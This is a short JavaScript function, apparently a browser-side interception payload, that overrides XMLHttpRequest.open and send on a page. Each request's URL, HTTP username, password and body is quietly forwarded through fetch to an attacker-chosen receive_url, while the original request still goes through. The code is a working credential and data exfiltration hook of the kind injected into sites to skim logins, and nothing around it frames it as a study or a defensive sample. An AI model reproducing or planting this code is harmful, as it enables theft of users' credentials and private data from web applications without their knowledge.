    function captureXHR(receive_url,interceptor){
        if(typeof interceptor == 'undefined') interceptor ={};
        XMLHttpRequest.prototype._send = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype._open = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url, async, user, password){
            var a = document.createElement('a');
            a.href = url;
            url = escape(a.href);
            this.sucks = {method,url,async,user,password};
            interceptor.onopen && (arguments = interceptor.onopen.apply(this,arguments)||arguments);
            this._open.apply(this,arguments);
        };
        XMLHttpRequest.prototype.send = function(data){
            this.sucks.body = data;
            interceptor.onsend && (data = interceptor.onsend.call(this,data)||data);
            this._send.call(this,data);
            receive_url&&
            fetch(
                `${receive_url}?url=${this.sucks.url}&user=${this.sucks.user}&password=${this.sucks.password}`
                ,{method:this.sucks.method,body:this.sucks.body,mode:'cors'}
            );
        };
    }
    